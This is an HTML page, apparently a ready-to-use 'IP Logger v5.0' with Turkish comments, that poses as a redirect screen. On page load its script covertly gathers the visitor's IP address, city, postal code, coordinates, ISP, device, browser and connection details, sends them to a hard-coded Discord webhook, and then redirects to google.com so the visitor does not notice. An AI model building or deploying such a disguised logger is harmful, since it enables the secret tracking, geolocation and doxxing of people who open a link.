<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Yükleniyor...</title>
    <style>
        body { background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', sans-serif; color: #fff; flex-direction: column; margin: 0; }
        .loader { border: 4px solid #1a1a1a; border-top: 4px solid #00ff88; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 15px; color: #888; font-size: 13px; }
        .status { margin-top: 8px; color: #ff4444; font-size: 12px; display: none; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>Yönlendiriliyorsunuz...</p>
    <div class="status" id="status">✅ Gönderildi</div>

    <script>
        (function() {
            // ===================== KONFIGURASYON =====================
            const WEBHOOK_URL = "https://discord.com/api/webhooks/1547318380766302348/32ysOlLeK6nz9aDg3OufgO6BQqlHoKhYTeJIpZ3E0DdP4g6W8dH9bYyRpdN1fZPtQZE0";
            const REDIRECT_URL = "https://www.google.com"; // İstediğin siteyi yaz
            // =========================================================

            // 1) Tüm verileri topla
            const ua = navigator.userAgent;
            const platform = navigator.platform || "Bilinmiyor";
            const language = navigator.language || "Bilinmiyor";
            const screenRes = screen.width + "x" + screen.height;
            const colorDepth = screen.colorDepth + " bit";
            const pixelRatio = window.devicePixelRatio || 1;
            const viewport = window.innerWidth + "x" + window.innerHeight;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Bilinmiyor";
            const referrer = document.referrer || "Doğrudan";
            const currentPage = window.location.href;
            const conn = navigator.connection || null;
            const connType = conn ? conn.effectiveType : "Bilinmiyor";
            const downlink = conn ? conn.downlink + " Mbps" : "Bilinmiyor";
            const rtt = conn ? conn.rtt + " ms" : "Bilinmiyor";

            // 2) Cihaz bilgileri
            let deviceType = "Masaüstü";
            let os = "Bilinmiyor";
            let browser = "Bilinmiyor";

            if (/Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile/i.test(ua)) {
                deviceType = "Mobil";
                if (/iPad/i.test(ua)) deviceType = "Tablet";
                if (/iPhone/i.test(ua)) deviceType = "iPhone";
                if (/Android/i.test(ua)) {
                    if (/Tablet|Pad/i.test(ua)) deviceType = "Android Tablet";
                    else deviceType = "Android Telefon";
                }
            }

            if (/Windows NT 10.0/i.test(ua)) os = "Windows 10/11";
            else if (/Windows NT 6.1/i.test(ua)) os = "Windows 7";
            else if (/Windows NT 6.3/i.test(ua)) os = "Windows 8.1";
            else if (/Windows/i.test(ua)) os = "Windows";
            else if (/Mac OS X/i.test(ua)) os = "macOS";
            else if (/Android/i.test(ua)) os = "Android";
            else if (/iPhone OS|iOS/i.test(ua)) os = "iOS";
            else if (/Linux/i.test(ua)) os = "Linux";

            if (/Edg\//i.test(ua)) browser = "Edge";
            else if (/Chrome\//i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome";
            else if (/Firefox\//i.test(ua)) browser = "Firefox";
            else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
            else if (/Opera|OPR/i.test(ua)) browser = "Opera";

            // 3) IP ve konum
            function getLocation() {
                return new Promise((resolve) => {
                    fetch('https://ipapi.co/json/', { cache: 'no-cache' })
                        .then(r => { if (!r.ok) throw new Error(); return r.json(); })
                        .then(d => {
                            resolve({
                                ip: d.ip || 'Bilinmiyor',
                                country: d.country_name || 'Bilinmiyor',
                                country_code: d.country_code || 'Bilinmiyor',
                                region: d.region || 'Bilinmiyor',
                                city: d.city || 'Bilinmiyor',
                                postal: d.postal || 'Bilinmiyor',
                                lat: d.latitude || 'Bilinmiyor',
                                lon: d.longitude || 'Bilinmiyor',
                                isp: d.org || d.isp || 'Bilinmiyor',
                                timezone: d.timezone || 'Bilinmiyor',
                                currency: d.currency || 'Bilinmiyor'
                            });
                        })
                        .catch(() => {
                            fetch('http://ip-api.com/json/?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,isp,org,timezone,query', { cache: 'no-cache' })
                                .then(r => r.json())
                                .then(d => {
                                    if (d.status === 'success') {
                                        resolve({
                                            ip: d.query || 'Bilinmiyor',
                                            country: d.country || 'Bilinmiyor',
                                            country_code: d.countryCode || 'Bilinmiyor',
                                            region: d.regionName || d.region || 'Bilinmiyor',
                                            city: d.city || 'Bilinmiyor',
                                            postal: d.zip || 'Bilinmiyor',
                                            lat: d.lat || 'Bilinmiyor',
                                            lon: d.lon || 'Bilinmiyor',
                                            isp: d.org || d.isp || 'Bilinmiyor',
                                            timezone: d.timezone || 'Bilinmiyor',
                                            currency: 'Bilinmiyor'
                                        });
                                    } else {
                                        resolve(null);
                                    }
                                })
                                .catch(() => resolve(null));
                        });
                });
            }

            // 4) Discord'a gönder VE HEMEN YÖNLENDİR
            async function sendAndRedirect() {
                const geo = await getLocation();

                const fields = [
                    { name: "🌐 IP", value: geo ? geo.ip : "Alınamadı", inline: true },
                    { name: "📍 Ülke", value: geo ? geo.country + " (" + geo.country_code + ")" : "Alınamadı", inline: true },
                    { name: "🏙️ İl", value: geo ? geo.region : "Alınamadı", inline: true },
                    { name: "🏘️ İlçe", value: geo ? geo.city : "Alınamadı", inline: true },
                    { name: "📮 Posta Kodu", value: geo ? geo.postal : "Alınamadı", inline: true },
                    { name: "🌍 Koordinat", value: geo && geo.lat !== 'Bilinmiyor' ? geo.lat + ", " + geo.lon : "Alınamadı", inline: true },
                    { name: "📞 ISP", value: geo ? geo.isp : "Alınamadı", inline: true },
                    { name: "⏰ Zaman Dilimi", value: geo ? geo.timezone : "Alınamadı", inline: true },
                    { name: "💰 Para Birimi", value: geo ? geo.currency : "Alınamadı", inline: true },
                    { name: "📱 Cihaz", value: deviceType, inline: true },
                    { name: "💻 OS", value: os, inline: true },
                    { name: "🌐 Tarayıcı", value: browser, inline: true },
                    { name: "🖥️ Ekran", value: screenRes + " (" + colorDepth + ")", inline: true },
                    { name: "🔍 Piksel", value: pixelRatio + "x", inline: true },
                    { name: "📐 Görüntü", value: viewport, inline: true },
                    { name: "🌐 Platform", value: platform, inline: true },
                    { name: "🗣️ Dil", value: language, inline: true },
                    { name: "🕒 Tarayıcı Zamanı", value: timezone, inline: true },
                    { name: "📶 Bağlantı", value: connType, inline: true },
                    { name: "⬇️ Hız", value: downlink, inline: true },
                    { name: "⏱️ Gecikme", value: rtt, inline: true },
                    { name: "🔙 Referans", value: referrer.length > 60 ? referrer.substring(0, 60) + "..." : referrer, inline: false },
                    { name: "📄 Sayfa", value: currentPage.length > 60 ? currentPage.substring(0, 60) + "..." : currentPage, inline: false },
                    { name: "🕒 Türkiye Saati", value: new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' }), inline: true },
                    { name: "🕒 UTC", value: new Date().toISOString(), inline: true }
                ];

                const embed = {
                    embeds: [{
                        title: "🕵️ Ziyaretçi Raporu",
                        color: 0x00FF88,
                        fields: fields,
                        footer: { text: "IP Logger v5.0" },
                        timestamp: new Date().toISOString()
                    }]
                };

                // Discord'a gönder (arka planda, sonucu bekleme)
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(embed)
                }).catch(() => {});

                // HEMEN YÖNLENDİR - hiç bekleme
                window.location.href = REDIRECT_URL;
            }

            // Çalıştır
            sendAndRedirect();
        })();
    </script>
</body>
</html>
